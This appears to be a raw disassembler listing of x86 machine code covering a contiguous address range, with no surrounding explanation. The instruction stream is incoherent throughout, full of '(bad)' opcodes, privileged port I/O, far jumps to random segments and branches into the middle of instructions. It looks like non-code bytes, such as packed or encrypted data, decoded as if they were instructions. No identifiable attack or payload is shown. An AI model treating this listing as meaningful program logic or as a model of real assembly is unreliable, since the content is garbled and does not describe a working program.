  4254f1:	xchg   BYTE PTR [ecx-0x80b312d],bl
  4254f7:	and    eax,0xa568aa64
  4254fc:	out    dx,eax
  4254fd:	icebp  
  4254fe:	or     DWORD PTR [edx+0x3924620a],0xffffffad
  425505:	add    DWORD PTR [ecx],edi
  425507:	mov    esp,0xfd515be
  42550c:	mov    ecx,edx
  42550e:	jbe    0x425551
  425510:	pop    ecx
  425511:	movlps QWORD PTR [edx+esi*2-0x1],xmm0
  425516:	or     esp,DWORD PTR [esi+eax*4+0x61]
  42551a:	and    BYTE PTR [esi],0xcf
  42551d:	xchg   esi,eax
  42551e:	push   eax
  42551f:	inc    ecx
  425520:	cmp    DWORD PTR [eax+0x5a60cfe3],esp
  425526:	pushf  
  425527:	sbb    BYTE PTR [esi-0x7d],ch
  42552a:	pop    esi
  42552b:	pop    edx
  42552c:	(bad)  
  42552d:	out    0x30,eax
  42552f:	sbb    al,0xe4
  425531:	mov    ecx,0x6479d3ba
  425536:	mov    eax,ds:0x89ef7bc6
  42553b:	xchg   BYTE PTR [ebp-0x5b],ah
  42553e:	jle    0x425525
  425540:	adc    BYTE PTR [esi*1+0x7719d3e0],al
  425547:	scas   eax,DWORD PTR es:[edi]
  425548:	add    DWORD PTR [edi+ebx*2-0x7979d4d6],ebp
  42554f:	mov    ebp,0x3710a8e0
  425554:	dec    edi
  425555:	cli    
  425556:	mov    bh,0xa2
  425558:	xlat   BYTE PTR ds:[ebx]
  425559:	daa    
  42555a:	push   esi
  42555b:	pop    eax
  42555c:	mov    al,ds:0xeb386b73
  425561:	dec    ebx
  425562:	(bad)  
  425563:	xlat   BYTE PTR ds:[ebx]
  425564:	jo     0x42550c
  425566:	pop    ss
  425567:	mov    DWORD PTR [ebx+0x4c],edx
  42556a:	(bad)  [ebx+edi*4-0x3f]
  42556e:	aam    0xb
  425570:	(bad)
  425574:	mov    al,BYTE PTR ds:0x251d41e
  42557a:	fwait
  42557b:	in     al,0xa
  42557d:	fisubr WORD PTR [eax-0x39]
  425580:	jmp    0x499d:0x27e5794b
  425587:	xchg   ebx,eax
  425588:	(bad)  
  42558a:	cwde   
  42558b:	or     BYTE PTR [bx+0x4e7],cl
  425590:	addr16 pop esi
  425592:	out    dx,eax
  425593:	or     ah,BYTE PTR [eax-0x36902fe4]
  425599:	fdiv   QWORD PTR [ebx+0x79]
  42559c:	xor    DWORD PTR [edx],0xffffffd6
  42559f:	fucomp st(1)
  4255a1:	test   BYTE PTR ds:[edi+0x3569ca5],0xf9
  4255a9:	jmp    0x425619
  4255ab:	sub    bl,BYTE PTR [eax-0x76]
  4255ae:	xor    ebx,DWORD PTR [eax]
  4255b0:	xlat   BYTE PTR ds:[ebx]
  4255b1:	ins    DWORD PTR es:[edi],dx
  4255b2:	push   0xe260c9ed
  4255b7:	ja     0x4255cd
  4255b9:	icebp  
  4255ba:	dec    eax
  4255bb:	cmp    ah,bl
  4255bd:	dec    esp
  4255be:	inc    eax
  4255bf:	add    BYTE PTR [esi-0x16],dh
  4255c2:	or     BYTE PTR [ebp-0x24],bl
  4255c5:	sub    esi,DWORD PTR [ecx+ebp*8]
  4255c8:	inc    edx
  4255c9:	push   ecx
  4255ca:	cmc    
  4255cb:	out    dx,al
  4255cc:	add    eax,0x96a97638
  4255d1:	shr    DWORD PTR [ebx-0x3181a21e],1
  4255d7:	jbe    0x4255d8
  4255d9:	xlat   BYTE PTR ds:[ebx]
  4255da:	jl     0x4255b5
  4255dc:	out    dx,al
  4255dd:	and    BYTE PTR [eax-0x4d],0xd
  4255e1:	sbb    eax,0xe0adfed5
  4255e6:	jbe    0x425662
  4255e8:	pop    ds
  4255e9:	fs push edi
  4255eb:	cli    
  4255ec:	jb     0x42559f
  4255ee:	or     DWORD PTR [ecx+0x58f6664f],edi
  4255f4:	mov    bl,0x11
  4255f6:	mov    ebp,0x8a83c175
  4255fb:	sbb    bl,0xf4
  4255fe:	dec    edx
  4255ff:	pop    ebx
  425600:	ret    
  425601:	loope  0x42561d
  425603:	in     al,dx
  425604:	bswap  esp
  425606:	xchg   BYTE PTR [edx+0x5ec0bbd2],ch
  42560c:	retf   
  42560d:	cli    
  42560e:	cmp    edx,DWORD PTR [eax+0x18]
  425611:	and    esp,DWORD PTR [edx+0x2a3770a5]
  425617:	pop    ebx
  425618:	fsubr  QWORD PTR [eax]
  42561a:	iret   
  42561b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42561d:	pusha  
  42561e:	xchg   ecx,eax
  42561f:	(bad)  
  425620:	ins    BYTE PTR es:[edi],dx
  425621:	jbe    0x425694
  425623:	test   al,0x36
  425625:	jge    0x425670
  425627:	or     edx,DWORD PTR [edi-0x35]
  42562a:	push   ebp
  42562b:	(bad)  
  42562c:	pop    es
  42562d:	inc    esi
  42562e:	sbb    eax,0x548a3949
  425633:	or     eax,0x868befde
  425638:	iret   
  425639:	aaa    
  42563a:	push   ecx
  42563b:	test   BYTE PTR [edi],ah
  42563d:	xchg   esp,eax
  42563e:	dec    edx
  42563f:	mov    esi,0x4383c22a
  425644:	or     eax,0xf8691278
  425649:	mov    esi,0x43a1ee5d
  42564e:	pop    esi
  42564f:	int    0x23
  425651:	mov    al,0xdb
  425653:	(bad)  
  425655:	leave  
  425656:	mov    DWORD PTR [esi+0x7c40e3b6],ebx
  42565c:	sbb    al,bh
  42565e:	ret    0x29cd
  425661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425662:	mov    cl,0x9
  425664:	adc    ah,al
  425666:	lods   al,BYTE PTR ds:[esi]
  425667:	pushf  
  425668:	inc    ebx
  425669:	outs   dx,BYTE PTR ds:[esi]
  42566a:	jb     0x42560b
  42566c:	cmp    BYTE PTR [edi+eax*1-0x770c4cff],ah
  425673:	into   
  425674:	mov    WORD PTR [edx+0x6d],gs
  425677:	fcom   DWORD PTR [ecx]
  425679:	push   cs
  42567a:	out    0x56,eax
  42567c:	leave  
  42567d:	aad    0xf2
  42567f:	fucom  st(4)
  425681:	and    DWORD PTR [ecx-0x374fcebf],eax
  425687:	icebp  
  425688:	int    0x52
  42568a:	cmp    al,0xc8
  42568c:	pop    ds
  42568d:	in     eax,dx
  42568e:	sub    BYTE PTR [edi+ecx*1],bl
  425691:	clc    
  425692:	push   edi
  425693:	outs   dx,DWORD PTR ds:[esi]
  425694:	mov    dl,0x16
  425696:	jns    0x4256f6
  425698:	arpl   WORD PTR ds:0x968c63b9,si
  42569e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42569f:	sbb    al,0xaf
  4256a1:	(bad)  
  4256a2:	in     al,dx
  4256a3:	xor    ch,al
  4256a5:	out    0xb,al
  4256a7:	fst    QWORD PTR [ecx]
  4256a9:	scas   eax,DWORD PTR es:[edi]
  4256aa:	inc    eax
  4256ab:	dec    esi
  4256ac:	out    dx,eax
  4256ad:	xor    al,0xda
	...
  4256b7:	add    BYTE PTR [eax],al
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	leave  
  4256c7:	ins    BYTE PTR es:[edi],dx
  4256c8:	fisub  DWORD PTR [ebx]
  4256ca:	xchg   esi,eax
  4256cb:	into   
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	std    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR ds:0x906f0db2,cl
  4256d7:	mov    ebp,0x9a601d46
  4256dc:	hlt    
  4256dd:	mov    eax,0x4137eb32
  4256e2:	loope  0x425716
  4256e4:	mov    ds:0x6ac1317e,eax
  4256e9:	adc    BYTE PTR ds:0xbcddab4f,bh
  4256ef:	and    eax,0xb143b64d
  4256f4:	xchg   ebp,eax
  4256f5:	arpl   WORD PTR [eax-0x44c00036],bx
  4256fb:	and    al,0xf5
  4256fd:	jmp    0xed4b:0x110854a
  425704:	mov    eax,ds:0x4e7d7691
  425709:	(bad)  [eax-0x2e274736]
  42570f:	mov    bl,0xb
  425711:	mov    cs,WORD PTR [ecx]
  425713:	mov    DWORD PTR [esi-0x2dafdc18],0x8fe417d8
  42571d:	sahf   
  42571e:	mov    cl,0x4b
  425720:	mov    ecx,0x305271b
  425725:	cwde   
  425726:	pusha  
  425727:	loop   0x4256cd
  425729:	imul   edx,DWORD PTR ds:0xa2a34839,0x45
  425730:	fstp   TBYTE PTR [ebx-0x30]
  425733:	dec    esi
  425734:	dec    eax
  425735:	ret    0xa64e
  425738:	ret    
  425739:	sbb    eax,0x1f919193
  42573e:	or     dl,bh
  425740:	cmp    edx,edi
  425742:	add    DWORD PTR [edx-0x75c4f17e],0x32
  425749:	push   esp
  42574a:	or     esi,ecx
  42574c:	dec    esi
  42574d:	push   edx
  42574e:	fcom   DWORD PTR [ecx-0x50a4983f]
  425754:	outs   dx,BYTE PTR ds:[esi]
  425755:	arpl   WORD PTR [eax-0x53d0e1c2],si
  42575b:	sbb    eax,0x7b6141ed
  425760:	add    al,0x63
  425762:	js     0x42571b
  425764:	sahf   
  425765:	imul   ecx,DWORD PTR [eax-0x3],0x161236e
  42576c:	(bad)  
  42576d:	sub    BYTE PTR [esi-0x32],bl
  425770:	xchg   ecx,eax
  425771:	xor    ecx,DWORD PTR [esi-0x265330c2]
  425777:	fadd   DWORD PTR [ebx+ebx*4+0x2881172e]
  42577e:	mov    al,0xa4
  425780:	mov    ah,0x2a
  425782:	jno    0x4257e2
  425784:	or     ch,BYTE PTR [edx]
  425786:	sub    DWORD PTR [edx],edx
  425788:	ret    
  425789:	sahf   
  42578a:	(bad)
  42578d:	scas   al,BYTE PTR es:[edi]
  42578e:	dec    edx
  42578f:	mov    dh,0xb7
  425791:	mov    WORD PTR [edx],ss
  425793:	not    DWORD PTR [ecx+0xd]
  425796:	jne    0x425750
  425798:	mov    DWORD PTR [eax],ebx
  42579a:	cmp    al,al
  42579c:	xchg   ecx,eax
  42579d:	cmp    al,dl
  42579f:	mov    bh,0x14
  4257a1:	cmp    eax,0xddd29012
  4257a6:	outs   dx,BYTE PTR ds:[esi]
  4257a7:	std    
  4257a8:	scas   al,BYTE PTR es:[edi]
  4257a9:	(bad)  
  4257aa:	push   0x65
  4257ac:	fstp   TBYTE PTR [eax+0x5afc7361]
  4257b2:	outs   dx,BYTE PTR ds:[esi]
  4257b3:	jb     0x42573e
  4257b5:	xor    DWORD PTR [edi],edi
  4257b7:	push   edx
  4257b8:	arpl   WORD PTR [ebx+0x49c59afe],ax
  4257be:	mov    al,0x95
  4257c0:	adc    ebp,DWORD PTR [ebp+0x431a1b45]
  4257c6:	sbb    al,0x48
  4257c8:	fisttp DWORD PTR [edx+0x36]
  4257cb:	dec    ebx
  4257cc:	xchg   DWORD PTR [ecx],ecx
  4257ce:	push   ebp
  4257cf:	aaa    
  4257d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257d1:	jno    0x4257ba
  4257d3:	jecxz  0x4257d6
  4257d5:	adc    dl,BYTE PTR [esp+edx*1-0xb]
  4257d9:	push   0xffffffad
  4257db:	shl    DWORD PTR [esi+0x2f],0x47
  4257df:	mov    edx,0xadbcfb08
  4257e4:	xchg   esp,eax
  4257e5:	in     eax,dx
  4257e6:	rol    BYTE PTR [edi+0x353afe8d],1
  4257ec:	mov    ebx,eax
  4257ee:	and    BYTE PTR [ecx],dh
  4257f0:	inc    esi
  4257f1:	push   ebx
  4257f2:	dec    edi
  4257f3:	pop    es
  4257f4:	xor    cl,dl
  4257f6:	push   eax
  4257f7:	mov    BYTE PTR [ebp+0x21cba02f],bl
  4257fd:	push   esp
  4257fe:	sti    
  4257ff:	inc    edx
  425800:	cld    
  425801:	lahf   
  425802:	daa    
  425803:	fiadd  DWORD PTR [eax*1-0x1319d453]
  42580a:	mov    ch,0xe7
  42580d:	cli    
  42580e:	ja     0x425810
  425810:	stos   BYTE PTR es:[edi],al
  425811:	daa    
  425812:	mov    bh,0xf4
  425814:	jmp    0x4738c38
  425819:	test   eax,0x4ea22a3
  42581e:	test   DWORD PTR [ebx+edi*1+0x46],ecx
  425822:	arpl   WORD PTR [edx+0x2b3d787d],si
  425828:	mov    edi,0x3b46ae95
  42582d:	inc    edx
  42582e:	jbe    0x425848
  425830:	mov    eax,0x26132ce5
  425835:	daa    
  425836:	test   ebx,0x65ee44e8
  42583c:	test   al,0xaa
  42583e:	and    ebx,ebp
  425840:	in     al,dx
  425841:	mov    WORD PTR [edi],gs
  425843:	push   es
  425844:	mov    WORD PTR [ebx+eax*2-0x7a],?
  425848:	icebp  
  425849:	mov    ecx,0xaea4428c
  42584e:	xchg   ebp,eax
  42584f:	lds    esp,FWORD PTR [esi-0x3c100353]
  425855:	jmp    0x18474eff
  42585a:	mov    bh,0xec
  42585c:	popa   
  42585d:	sahf   
  42585e:	pop    ebx
  42585f:	addr16 iret 
  425861:	dec    edi
  425862:	adc    ah,dh
  425864:	fistp  QWORD PTR [edx+0x1a]
  425867:	or     cl,dh
  425869:	mov    ah,0x7b
  42586b:	shr    DWORD PTR [eax],0xe7
  42586e:	shl    DWORD PTR [edx+0x27],cl
  425871:	mov    bl,0x99
  425873:	sbb    al,0xee
  425875:	pushf  
  425876:	jge    0x425831
  425878:	stos   DWORD PTR es:[edi],eax
  425879:	test   BYTE PTR [edi],ch
  42587b:	pop    esi
  42587c:	mov    al,0xbd
  42587e:	jp     0x42588e
  425880:	cli    
  425881:	sub    eax,0xc04f4fa4
  425886:	inc    DWORD PTR [edx]
  425888:	push   DWORD PTR [ebx-0x1a16d550]
  42588e:	retf   
  42588f:	lods   al,BYTE PTR ds:[esi]
  425890:	cmp    eax,0xe4bd6b4c
  425895:	outs   dx,DWORD PTR ds:[esi]
  425896:	or     ecx,DWORD PTR [esp+ebx*1-0x407e44c3]
  42589d:	push   esi
  42589e:	add    eax,0xc21a8292
  4258a3:	sbb    ebx,DWORD PTR [ebp+0x36f1a316]
  4258a9:	sub    BYTE PTR [eax+0x53],al
  4258ac:	jns    0x42591b
  4258ae:	retf   0x57bd
  4258b1:	sub    eax,0xe22dd222
  4258b6:	cmp    ebx,esi
  4258b8:	add    DWORD PTR [ecx+0x13],ecx
  4258bb:	jle    0x4258a7
  4258bd:	inc    esp
  4258be:	leave  
  4258bf:	xchg   ebp,eax
  4258c0:	inc    ebx
  4258c1:	lds    edi,FWORD PTR [edi]
  4258c3:	xor    esp,DWORD PTR [edi]
  4258c5:	or     eax,0xe32c088a
  4258ca:	jae    0x425932
  4258cc:	sbb    BYTE PTR [ecx+0x12],al
	...
  4258d7:	add    BYTE PTR [eax],al
  4258d9:	add    BYTE PTR [ebx+0x45],cl
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	js     0x4258ca
  4258e8:	mov    eax,0x1d09372
  4258ed:	add    ch,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    dh,dh
  4258f3:	adc    eax,0x180f97c2
  4258f8:	call   0x2399:0x7486306c
  4258ff:	mov    al,ds:0x62203a7d
  425904:	push   ecx
  425905:	add    ecx,ecx
  425907:	mov    esi,0xa0141ef7
  42590c:	mov    ecx,0x5904767a
  425911:	into   
  425912:	jle    0x4258fd
  425914:	mov    cl,BYTE PTR [esi-0x6]
  425917:	xor    BYTE PTR [ebx-0x54],0xed
  42591b:	mov    BYTE PTR [eax],bl
  42591d:	ja     0x425973
  42591f:	test   BYTE PTR [esi],bh
  425921:	in     al,dx
  425922:	aam    0xf1
  425924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425925:	adc    ecx,DWORD PTR [ebx]
  425927:	je     0x425988
  425929:	add    al,0xb7
  42592b:	sbb    al,0x9d
  42592d:	mov    ch,0x91
  42592f:	ret    
  425930:	je     0x4258bb
  425932:	(bad)  
  425933:	dec    eax
  425934:	and    al,0x49
  425936:	cmp    al,0x3f
  425938:	lods   eax,DWORD PTR ds:[esi]
  425939:	aad    0xd3
  42593b:	adc    bl,BYTE PTR [ecx]
  42593d:	fistp  DWORD PTR [edx]
  42593f:	aas    
  425940:	dec    ecx
  425941:	xor    al,0x74
  425943:	cmc    
  425944:	arpl   WORD PTR [edi],bp
  425946:	clc    
  425947:	repnz mov bh,0x7d
  42594a:	out    dx,eax
  42594b:	popf   
  42594c:	(bad)  
  42594d:	sbb    edi,DWORD PTR gs:[ebp+0x7e]
  425951:	retf   0xcd5d
  425954:	cmp    DWORD PTR [ecx],0xffffff97
  425957:	sub    edx,DWORD PTR [ebx-0x1b]
  42595a:	add    al,0x67
  42595c:	sub    BYTE PTR [edi-0x5b],ah
  42595f:	inc    edx
  425960:	imul   DWORD PTR [ebx]
  425962:	mov    ch,0x1f
  425964:	retf   
  425965:	push   esp
  425966:	jmp    0x4259e0
  425968:	sbb    ebp,DWORD PTR [eax]
  42596a:	pop    ecx
  42596b:	xchg   edi,eax
  42596c:	aaa    
  42596d:	sub    edi,DWORD PTR [esi-0x1a401dc3]
  425973:	xchg   edi,eax
  425974:	and    edx,DWORD PTR [ebp-0x6f]
  425977:	dec    edx
  425978:	sub    BYTE PTR [ebp+0x4e],cl
  42597b:	clc    
  42597c:	push   ecx
  42597d:	stc    
  42597e:	cwde   
  42597f:	aad    0x10
  425981:	xchg   DWORD PTR [eax-0x21],ebx
  425984:	in     al,0x17
  425986:	stos   DWORD PTR es:[edi],eax
  425987:	retf   
  425988:	int    0xfa
  42598a:	jl     0x42599c
  42598c:	push   edx
  42598d:	nop
  42598e:	pop    ebp
  42598f:	ins    BYTE PTR es:[edi],dx
  425990:	mov    DWORD PTR [edi-0x59219222],ebp
  425996:	les    edi,FWORD PTR [esi+0x49]
  425999:	scas   eax,DWORD PTR es:[edi]
  42599a:	or     BYTE PTR [esi-0x58],bh
  42599d:	jmp    0x4259e0
  42599f:	sbb    DWORD PTR ds:0xa6b1dc82,edi
  4259a5:	mov    eax,0xd8e5a5ef
  4259aa:	cmp    eax,0x2b03e205
  4259af:	xchg   edx,eax
  4259b0:	mov    esi,0x57548cc8
  4259b5:	ja     0x42597b
  4259b7:	int3   
  4259b8:	cmc    
  4259b9:	cmp    edi,ecx
  4259bb:	and    BYTE PTR [edx-0x21],al
  4259be:	or     eax,0x194bc1b2
  4259c3:	stos   BYTE PTR es:[edi],al
  4259c4:	into   
  4259c5:	push   ds
  4259c6:	retf   0xccf7
  4259c9:	cmp    al,0x7c
  4259cb:	sub    BYTE PTR [ebx+0x6a],ch
  4259ce:	fidivr WORD PTR [edx+0x5f6be599]
  4259d4:	cwde   
  4259d5:	add    DWORD PTR [ecx+0x4],ecx
  4259d8:	(bad)  
  4259d9:	fwait
  4259da:	dec    eax
  4259db:	and    al,0x1e
  4259dd:	push   ebx
  4259de:	jmp    0xb794:0x45a8c243
  4259e5:	iret   
  4259e6:	test   esi,eax
  4259e8:	fisubr WORD PTR [ebx]
  4259ea:	inc    edi
  4259eb:	sbb    DWORD PTR [edx-0x5d91e640],edx
  4259f1:	ja     0x425a59
  4259f3:	and    al,0xdb
  4259f5:	mov    bh,0x16
  4259f7:	cdq    
  4259f8:	jb     0x425a46
  4259fa:	sbb    ecx,DWORD PTR [edi+0x67]
  4259fd:	sub    DWORD PTR [edi+0x35],ebp
  425a00:	test   DWORD PTR [esi+0x14],ecx
  425a03:	pop    edx
  425a04:	(bad)  
  425a05:	rep outs dx,DWORD PTR ds:[esi]
  425a07:	data16 and al,0xe
  425a0a:	sub    edi,DWORD PTR [edi+0x75b44ef7]
  425a10:	(bad)  
  425a11:	hlt    
  425a12:	test   ebp,esp
  425a14:	fcom   DWORD PTR [eax+0x6be2e2b4]
  425a1a:	sbb    eax,0xccf0a0ba
  425a1f:	arpl   WORD PTR [ecx],si
  425a21:	sbb    ebp,DWORD PTR [ebx+ebx*2]
  425a24:	dec    ebp
  425a25:	lahf   
  425a26:	pop    ecx
  425a27:	test   al,0x7
  425a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a2a:	adc    esp,edx
  425a2c:	cli    
  425a2d:	mov    ecx,0x57fa1741
  425a32:	mov    bh,0x80
  425a34:	dec    esi
  425a35:	mov    ebp,0x12de6bcb
  425a3a:	xchg   ebx,eax
  425a3b:	sbb    DWORD PTR [edi-0x69],ebx
  425a3e:	dec    ebx
  425a3f:	mov    esp,0x2476ca2f
  425a44:	in     eax,0xb
  425a46:	dec    ecx
  425a47:	test   al,0x60
  425a49:	add    DWORD PTR [esi+ebx*8],edx
  425a4c:	repnz mov bh,0x60
  425a4f:	mov    dh,bh
  425a51:	mov    bh,0x8f
  425a53:	add    DWORD PTR [ebx],0x4277dcc7
  425a59:	xchg   ebx,eax
  425a5a:	in     eax,dx
  425a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a5c:	and    ah,BYTE PTR [esi]
  425a5e:	popf   
  425a5f:	sub    DWORD PTR [eax-0x7e],ebp
  425a62:	jl     0x425aa8
  425a64:	jmp    0xb401:0xb1b0124a
  425a6b:	pop    ecx
  425a6c:	xchg   edi,eax
  425a6d:	(bad)  
  425a6f:	aaa    
  425a70:	mov    ebx,DWORD PTR [edx-0x1903be20]
  425a76:	popf   
  425a77:	sahf   
  425a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a79:	mov    eax,ds:0x69a8804
  425a7e:	jmp    0x425ac3
  425a80:	cwde   
  425a81:	mov    edx,ecx
  425a83:	sahf   
  425a84:	hlt    
  425a85:	ja     0x425a09
  425a87:	std    
  425a88:	mov    ebp,DWORD PTR [eax-0x67e24a5e]
  425a8e:	and    BYTE PTR [ebp-0x12e3aee0],cl
  425a94:	repnz (bad) 
  425a96:	pop    ecx
  425a97:	mov    eax,ds:0xde90eee0
  425a9c:	psubw  mm4,mm0
  425a9f:	lock out 0x6d,eax
  425aa2:	lock inc ebx
  425aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aa5:	test   eax,0x88bed3c9
  425aaa:	gs adc al,0x4
  425aad:	and    al,0xb0
  425aaf:	ret    0x5843
  425ab2:	adc    esi,DWORD PTR [edx+0x43]
  425ab5:	dec    ecx
  425ab6:	lds    esi,FWORD PTR [ebp+0x2a410eba]
  425abc:	jmp    0xa60b:0x145461cb
  425ac3:	leave  
  425ac4:	mov    eax,ds:0x7ef78a30
  425ac9:	fmul   DWORD PTR ds:0x8c1a6b17
  425acf:	xor    al,BYTE PTR [ecx]
  425ad1:	xor    cl,bl
  425ad3:	sbb    BYTE PTR [esi],al
  425ad5:	push   eax
  425ad6:	push   ebx
  425ad7:	and    al,0x6c
  425ada:	popa   
  425adb:	dec    eax
  425adc:	icebp  
  425add:	outs   dx,DWORD PTR ds:[esi]
  425ade:	paddw  mm3,QWORD PTR ds:0xa136882
  425ae5:	inc    esp
  425ae6:	dec    ebp
  425ae7:	shr    BYTE PTR fs:[ecx+esi*1],1
  425aeb:	sbb    esp,DWORD PTR [esi+0x50]
  425aee:	out    0x0,eax
	...
  425af8:	add    BYTE PTR [eax],al
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	xor    eax,0x90d8e10e
  425b0b:	rol    BYTE PTR [ecx],cl
  425b0d:	add    ch,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [esi-0x74],cl
  425b14:	ret    
  425b15:	retf   
  425b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b17:	jmp    0xc819:0x679c1e3e
  425b1e:	stos   DWORD PTR es:[edi],eax
  425b1f:	adc    eax,0xa543bdbc
  425b24:	xor    eax,0x633750b1
  425b29:	add    al,0x86
  425b2b:	sub    dl,bl
  425b2d:	scas   eax,DWORD PTR es:[edi]
  425b2e:	cmc    
  425b2f:	aaa    
  425b30:	jg     0x425b5b
  425b32:	fucomi st,st(1)
  425b34:	aad    0x11
  425b36:	fld    TBYTE PTR [edi-0x6ee81c80]
  425b3c:	data16 cli 
  425b3e:	adc    DWORD PTR [edi-0x54f688bc],ebx
  425b44:	push   es
  425b45:	xchg   DWORD PTR fs:[eax-0x786f55e5],ebx
  425b4c:	cmp    BYTE PTR [edi],al
  425b4e:	test   edx,eax
  425b50:	(bad)  
  425b51:	xchg   ebx,eax
  425b52:	ins    BYTE PTR es:[edi],dx
  425b53:	or     dl,dl
  425b55:	add    al,BYTE PTR [edx]
  425b57:	sti    
  425b58:	adc    al,0xb8
  425b5a:	mov    eax,ds:0x88db3b39
  425b5f:	xor    esi,ecx
  425b61:	(bad)  
  425b62:	dec    edi
  425b63:	and    bh,BYTE PTR [ecx+0x231422c6]
  425b69:	mov    eax,0xc1b2f6ab
  425b6e:	jmp    0x425b6d
  425b70:	jle    0x425b06
  425b72:	add    al,ah
  425b74:	inc    ecx
  425b76:	cli    
  425b77:	pushf  
  425b78:	ds int3 
  425b7a:	out    dx,eax
  425b7b:	mov    edx,0x24e2aa4
  425b80:	mov    dh,0x79
  425b82:	stc    
  425b83:	cli    
  425b84:	jb     0x425b85
  425b86:	rcpps  xmm2,XMMWORD PTR [edi]
  425b89:	loop   0x425b9e
  425b8b:	mov    dl,BYTE PTR [esi]
  425b8d:	pop    esi
  425b8e:	add    BYTE PTR [ebx+eax*1-0x3c],ch
  425b92:	ins    BYTE PTR es:[edi],dx
  425b93:	xchg   esi,eax
  425b94:	mov    esp,ecx
  425b96:	test   al,0x7c
  425b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b99:	push   0xffffffaa
  425b9b:	out    dx,eax
  425b9c:	mov    DWORD PTR [ecx-0x3f6cd2b3],0x67c69a6b
  425ba6:	sub    BYTE PTR [ebx],bl
  425ba8:	fmul   st(2),st
  425baa:	retf   
  425bab:	cwde   
  425bac:	inc    ebx
  425bad:	add    DWORD PTR [ecx-0x3d],ebx
  425bb0:	int3   
  425bb1:	jae    0x425c08
  425bb3:	test   al,0xae
  425bb5:	sbb    BYTE PTR fs:[eax-0x6],ah
  425bb9:	in     al,0x74
  425bbb:	sbb    BYTE PTR [esi-0x1b],cl
  425bbe:	(bad)  
  425bbf:	inc    edx
  425bc0:	lock pop ecx
  425bc2:	xchg   edx,eax
  425bc3:	loop   0x425bc2
  425bc5:	adc    DWORD PTR [ebp-0x5c],ecx
  425bc8:	inc    ebx
  425bc9:	jnp    0x425bbe
  425bcb:	ror    BYTE PTR [ecx-0x2f338e98],cl
  425bd1:	or     bh,0xa1
  425bd4:	retf   
  425bd5:	mov    ebp,0x970076cb
  425bda:	add    al,0x7d
  425bdc:	xchg   ebx,eax
  425bdd:	dec    ecx
  425bde:	hlt    
  425bdf:	(bad)  
  425be0:	mov    bl,0x8e
  425be2:	test   eax,0x72ecf446
  425be7:	(bad)  
  425be8:	call   0x31559e7e
  425bed:	enter  0x320d,0xdb
  425bf1:	cmp    eax,0x422161cc
  425bf6:	test   BYTE PTR [edx],dh
  425bf8:	sar    bl,cl
  425bfa:	pushf  
  425bfb:	push   ss
  425bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bfd:	cmp    dh,BYTE PTR [edi+eiz*8+0x5669146d]
  425c04:	xchg   ecx,eax
  425c05:	test   ecx,edx
  425c07:	jne    0x425c5b
  425c09:	test   DWORD PTR [eax],ebx
  425c0b:	test   bh,ch
  425c0d:	lahf   
  425c0e:	jnp    0x425b91
  425c10:	push   ss
  425c11:	mov    cl,0xcc
  425c13:	jmp    0x8228:0x2c1f50a
  425c1a:	iret   
  425c1b:	xlat   BYTE PTR ds:[ebx]
  425c1c:	shl    edx,1
  425c1e:	arpl   WORD PTR [ebx-0x4ded5fc9],si
  425c24:	shl    BYTE PTR [ecx+eiz*1],cl
  425c27:	ret    
  425c28:	bound  edi,QWORD PTR [edx-0x5cac3cec]
  425c2e:	js     0x425bfb
  425c30:	iret   
  425c31:	mov    esi,0xbf686ae5
  425c36:	aaa    
  425c37:	cmp    al,0x46
  425c39:	sbb    eax,0x19e057c8
  425c3e:	xor    DWORD PTR [esi+0x3b],edi
  425c41:	loopne 0x425c79
  425c43:	mov    edi,ss
  425c45:	push   esp
  425c46:	test   al,0xdc
  425c48:	cmp    al,0x5b
  425c4a:	out    dx,eax
  425c4b:	and    eax,DWORD PTR [esi-0x2798df82]
  425c51:	es aaa 
  425c53:	aam    0xe9
  425c55:	scas   al,BYTE PTR es:[edi]
  425c56:	jne    0x425c1c
  425c58:	cmp    DWORD PTR [esi+0x7e],edi
  425c5b:	stos   DWORD PTR es:[edi],eax
  425c5c:	ins    BYTE PTR es:[edi],dx
  425c5d:	jg     0x425c81
  425c5f:	ret    
  425c60:	cli    
  425c61:	sbb    al,0xcf
  425c63:	call   0xc821cf4f
  425c68:	rol    BYTE PTR [ebx-0x3c4bcaa6],cl
  425c6e:	push   edi
  425c6f:	adc    eax,0x4c00a734
  425c74:	lock mov ecx,0x37cf0284
  425c7a:	jmp    0x425c53
  425c7c:	aam    0xbb
  425c7e:	cmp    BYTE PTR [esi+edx*2-0x48],bh
  425c82:	xchg   ecx,eax
  425c83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c84:	js     0x425ce6
  425c86:	jg     0x425ce8
  425c88:	inc    esp
  425c89:	repnz fwait
  425c8b:	jecxz  0x425cc8
  425c8d:	xchg   edi,eax
  425c8e:	mov    esi,0x50d24502
  425c93:	ret    0x7965
  425c96:	nop
  425c97:	mov    ebp,0x948c359f
  425c9c:	mov    edi,0x79330d7d
  425ca1:	loopne 0x425c39
  425ca3:	xchg   ecx,eax
  425ca4:	xchg   ecx,eax
  425ca5:	add    BYTE PTR [edx+ebx*1],ah
